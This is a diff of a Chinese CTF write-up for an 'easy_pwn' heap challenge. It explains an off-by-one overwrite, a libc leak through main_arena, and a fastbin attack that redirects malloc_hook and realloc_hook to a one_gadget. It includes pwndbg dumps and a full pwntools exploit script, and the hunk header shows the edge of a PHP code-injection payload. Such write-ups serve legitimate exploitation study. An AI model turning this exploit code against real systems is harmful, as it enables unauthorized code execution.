@@ -279,174 +279,166 @@ calc.php?%20num=ls;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).c
 
   
 
-  * ### easy_pwn
+* ### easy_pwn
+
+  ubuntu 16
+
+  edit时输入的size比create的size大10时可以多输入一个字节，off-by-one
+
+  malloc(0x68) 0,1,2,3,4,5,6
+
+  edit(1)，覆盖2的size，使2的size为2、3size和
+
+  free(2) 进unsorted bin，fd、bk为main_arena+88
+
+      pwndbg> x/64gx 0x7fffc806e070
+      0x7fffc806e070: 0x0000000000000000      0x0000000000000071
+      0x7fffc806e080: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e090: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e0a0: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e0b0: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e0c0: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e0d0: 0x6161616161616161      0x6161616161616161
+      0x7fffc806e0e0: 0x0000000000000000      0x00000000000000e1
+      0x7fffc806e0f0: 0x00007ffb99bf4b78      0x00007ffb99bf4b78
+      0x7fffc806e100: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e110: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e120: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e130: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e140: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e150: 0x0000000000000000      0x0000000000000071
+      0x7fffc806e160: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e170: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e180: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e190: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e1a0: 0x0000000000000000      0x0000000000000000
+      0x7fffc806e1b0: 0x0000000000000000      0x0000000000000000
+
+  malloc(0x68) 切割unsorted，main_arena+88进3
+
+  show(3)，泄露main_arena+88
+
+      pwndbg> x/64gx 0x7fffc5391070
+      0x7fffc5391070: 0x0000000000000000      0x0000000000000071
+      0x7fffc5391080: 0x6161616161616161      0x6161616161616161
+      0x7fffc5391090: 0x6161616161616161      0x6161616161616161
+      0x7fffc53910a0: 0x6161616161616161      0x6161616161616161
+      0x7fffc53910b0: 0x6161616161616161      0x6161616161616161
+      0x7fffc53910c0: 0x6161616161616161      0x6161616161616161
+      0x7fffc53910d0: 0x6161616161616161      0x6161616161616161
+      0x7fffc53910e0: 0x0000000000000000      0x0000000000000071
+      0x7fffc53910f0: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391100: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391110: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391120: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391130: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391140: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391150: 0x0000000000000000      0x0000000000000071
+      0x7fffc5391160: 0x00007f58f5bf4b78      0x00007f58f5bf4b78
+      0x7fffc5391170: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391180: 0x0000000000000000      0x0000000000000000
+      0x7fffc5391190: 0x0000000000000000      0x0000000000000000
+      0x7fffc53911a0: 0x0000000000000000      0x0000000000000000
+      0x7fffc53911b0: 0x0000000000000000      0x0000000000000000
+
+  edit(4)，覆盖5的size，使5的size为5、6size和
+
+  free(5)
+
+  malloc(0xd0)，edit(5)，把6的size改回来，free(6)
+
+      pwndbg> x/64gx 0x7fffcf5a3230
+      0x7fffcf5a3230: 0x0000000000000000      0x00000000000000e1
+      0x7fffcf5a3240: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a3250: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a3260: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a3270: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a3280: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a3290: 0x0505050505050505      0x0505050505050505
+      0x7fffcf5a32a0: 0x0505050505050505      0x0000000000000070
+      0x7fffcf5a32b0: 0x0000000000000000      0x0606060606060606
+      0x7fffcf5a32c0: 0x0606060606060606      0x0606060606060606
+      0x7fffcf5a32d0: 0x0606060606060606      0x0606060606060606
+      0x7fffcf5a32e0: 0x0606060606060606      0x0606060606060606
+      0x7fffcf5a32f0: 0x0606060606060606      0x0606060606060606
+      0x7fffcf5a3300: 0x0606060606060606      0x0606060606060606
+      0x7fffcf5a3310: 0x0000000000000000      0x0000000000020cf1
+
+  现在可以通过edit(5)控制6的fd，进行fastbin attack
+
+  直接把one_gadget写入malloc_hook不可用，需要利用realloc_hook调整
+
+  把one_gadget写入realloc_hook，把realloc写入malloc_hook
+
+  执行realloc调整，然后跳到realloc_hook，执行one_gadget
+
+  ```python
+  from pwn import *
+  r = process('./easy_pwn')
+  #r = remote('node3.buuoj.cn', 28951)
+  elf = ELF('./easy_pwn')
+  libc = ELF('libc-2.23.so')
   
-    ubuntu 16
+  def create(size):
+      r.sendlineafter('choice: ','1')
+      r.sendlineafter('size: ',str(size))
   
-    edit时输入的size比create的size大10时可以多输入一个字节，off-by-one
+  def edit(index,size,content):
+      r.sendlineafter('choice: ','2')
+      r.sendlineafter('index: ',str(index))
+      r.sendlineafter('size: ',str(size))
+      r.sendlineafter('content: ',content)
   
-    malloc(0x68) 0,1,2,3,4,5,6
+  def free(index):
+      r.sendlineafter('choice: ','3')
+      r.sendlineafter('index: ',str(index))
   
-    edit(1)，覆盖2的size，使2的size为2、3size和
+  def show(index):
+      r.sendlineafter('choice: ','4')
+      r.sendlineafter('index: ',str(index))
+      
+  create(0x68)#0
+  create(0x68)#1
+  create(0x68)#2
+  create(0x68)#3
+  create(0x68)#4
+  create(0x68)#5
+  create(0x68)#6
   
-    free(2) 进unsorted bin，fd、bk为main_arena+88
+  edit(1,0x68+10,'a'*0x60+p64(0)+'\xe1')
+  free(2)
+  create(0x68)#2
   
-    ```c
-    pwndbg> x/64gx 0x7fffc806e070
-    0x7fffc806e070: 0x0000000000000000      0x0000000000000071
-    0x7fffc806e080: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e090: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e0a0: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e0b0: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e0c0: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e0d0: 0x6161616161616161      0x6161616161616161
-    0x7fffc806e0e0: 0x0000000000000000      0x00000000000000e1
-    0x7fffc806e0f0: 0x00007ffb99bf4b78      0x00007ffb99bf4b78
-    0x7fffc806e100: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e110: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e120: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e130: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e140: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e150: 0x0000000000000000      0x0000000000000071
-    0x7fffc806e160: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e170: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e180: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e190: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e1a0: 0x0000000000000000      0x0000000000000000
-    0x7fffc806e1b0: 0x0000000000000000      0x0000000000000000
-    ```
+  show(3)
+  r.recvuntil('content: ')
+  fuck = u64(r.recv(6).ljust(8,'\x00'))
+  main_arena = fuck - 88
+  libc_base = main_arena - 0x3c4b20
+  one = libc_base+0x4526a
+  realloc = libc_base+libc.symbols['realloc']
+  fuck_addr = main_arena-0x33
+  malloc_hook = main_arena-0x10
+  realloc_hook = main_arena-0x18
+  log.success('main_arena:'+hex(main_arena))
+  log.success('libc_base:'+hex(libc_base))
+  log.success('one:'+hex(one))
+  log.success('realloc:'+hex(realloc))
+  log.success('fuck_addr:'+hex(fuck_addr))
+  log.success('malloc_hook:'+hex(malloc_hook))
+  log.success('realloc_hook:'+hex(realloc_hook))
   
-    malloc(0x68) 切割unsorted，main_arena+88进3
+  edit(4,0x68+10,'\x00'*0x60+p64(0)+'\xe1')
+  free(5)
   
-    show(3)，泄露main_arena+88
+  create(0xd0)#5
+  edit(5,0xd0,'\x05'*0x68+p64(0x70)+'\x06'*0x60)
+  free(6)
+  edit(5,0xd0,'\x00'*0x68+p64(0x70)+p64(fuck_addr)+'\x00'*0x58)
   
-    ```c
-    pwndbg> x/64gx 0x7fffc5391070
-    0x7fffc5391070: 0x0000000000000000      0x0000000000000071
-    0x7fffc5391080: 0x6161616161616161      0x6161616161616161
-    0x7fffc5391090: 0x6161616161616161      0x6161616161616161
-    0x7fffc53910a0: 0x6161616161616161      0x6161616161616161
-    0x7fffc53910b0: 0x6161616161616161      0x6161616161616161
-    0x7fffc53910c0: 0x6161616161616161      0x6161616161616161
-    0x7fffc53910d0: 0x6161616161616161      0x6161616161616161
-    0x7fffc53910e0: 0x0000000000000000      0x0000000000000071
-    0x7fffc53910f0: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391100: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391110: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391120: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391130: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391140: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391150: 0x0000000000000000      0x0000000000000071
-    0x7fffc5391160: 0x00007f58f5bf4b78      0x00007f58f5bf4b78
-    0x7fffc5391170: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391180: 0x0000000000000000      0x0000000000000000
-    0x7fffc5391190: 0x0000000000000000      0x0000000000000000
-    0x7fffc53911a0: 0x0000000000000000      0x0000000000000000
-    0x7fffc53911b0: 0x0000000000000000      0x0000000000000000
-    ```
+  create(0x68)#6
+  create(0x68)#7
   
-    edit(4)，覆盖5的size，使5的size为5、6size和
-  
-    free(5)
-  
-    malloc(0xd0)，edit(5)，把6的size改回来，free(6)
-  
-    ```
-    pwndbg> x/64gx 0x7fffcf5a3230
-    0x7fffcf5a3230: 0x0000000000000000      0x00000000000000e1
-    0x7fffcf5a3240: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a3250: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a3260: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a3270: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a3280: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a3290: 0x0505050505050505      0x0505050505050505
-    0x7fffcf5a32a0: 0x0505050505050505      0x0000000000000070
-    0x7fffcf5a32b0: 0x0000000000000000      0x0606060606060606
-    0x7fffcf5a32c0: 0x0606060606060606      0x0606060606060606
-    0x7fffcf5a32d0: 0x0606060606060606      0x0606060606060606
-    0x7fffcf5a32e0: 0x0606060606060606      0x0606060606060606
-    0x7fffcf5a32f0: 0x0606060606060606      0x0606060606060606
-    0x7fffcf5a3300: 0x0606060606060606      0x0606060606060606
-    0x7fffcf5a3310: 0x0000000000000000      0x0000000000020cf1
-    ```
-  
-    现在可以通过edit(5)控制6的fd，进行fastbin attack
-  
-    直接把one_gadget写入malloc_hook不可用，需要利用realloc_hook调整
-  
-    把one_gadget写入realloc_hook，把realloc写入malloc_hook
-  
-    执行realloc调整，然后跳到realloc_hook，执行one_gadget
-  
-    ```python
-    from pwn import *
-    r = process('./easy_pwn')
-    #r = remote('node3.buuoj.cn', 28951)
-    elf = ELF('./easy_pwn')
-    libc = ELF('libc-2.23.so')
-    
-    def create(size):
-        r.sendlineafter('choice: ','1')
-        r.sendlineafter('size: ',str(size))
-    
-    def edit(index,size,content):
-        r.sendlineafter('choice: ','2')
-        r.sendlineafter('index: ',str(index))
-        r.sendlineafter('size: ',str(size))
-        r.sendlineafter('content: ',content)
-    
-    def free(index):
-        r.sendlineafter('choice: ','3')
-        r.sendlineafter('index: ',str(index))
-    
-    def show(index):
-        r.sendlineafter('choice: ','4')
-        r.sendlineafter('index: ',str(index))
-        
-    create(0x68)#0
-    create(0x68)#1
-    create(0x68)#2
-    create(0x68)#3
-    create(0x68)#4
-    create(0x68)#5
-    create(0x68)#6
-    
-    edit(1,0x68+10,'a'*0x60+p64(0)+'\xe1')
-    free(2)
-    create(0x68)#2
-    
-    show(3)
-    r.recvuntil('content: ')
-    fuck = u64(r.recv(6).ljust(8,'\x00'))
-    main_arena = fuck - 88
-    libc_base = main_arena - 0x3c4b20
-    one = libc_base+0x4526a
-    realloc = libc_base+libc.symbols['realloc']
-    fuck_addr = main_arena-0x33
-    malloc_hook = main_arena-0x10
-    realloc_hook = main_arena-0x18
-    log.success('main_arena:'+hex(main_arena))
-    log.success('libc_base:'+hex(libc_base))
-    log.success('one:'+hex(one))
-    log.success('realloc:'+hex(realloc))
-    log.success('fuck_addr:'+hex(fuck_addr))
-    log.success('malloc_hook:'+hex(malloc_hook))
-    log.success('realloc_hook:'+hex(realloc_hook))
-    
-    edit(4,0x68+10,'\x00'*0x60+p64(0)+'\xe1')
-    free(5)
-    
-    create(0xd0)#5
-    edit(5,0xd0,'\x05'*0x68+p64(0x70)+'\x06'*0x60)
-    free(6)
-    edit(5,0xd0,'\x00'*0x68+p64(0x70)+p64(fuck_addr)+'\x00'*0x58)
-    
-    create(0x68)#6
-    create(0x68)#7
-    
-    edit(7,0x68,'\x00'*0xb+p64(one)+p64(realloc)+'\x00'*0x4d)
-    create(0x68)
-    r.interactive()
-    ```
-  
-    
+  edit(7,0x68,'\x00'*0xb+p64(one)+p64(realloc)+'\x00'*0x4d)
+  create(0x68)
+  r.interactive()
+  ```
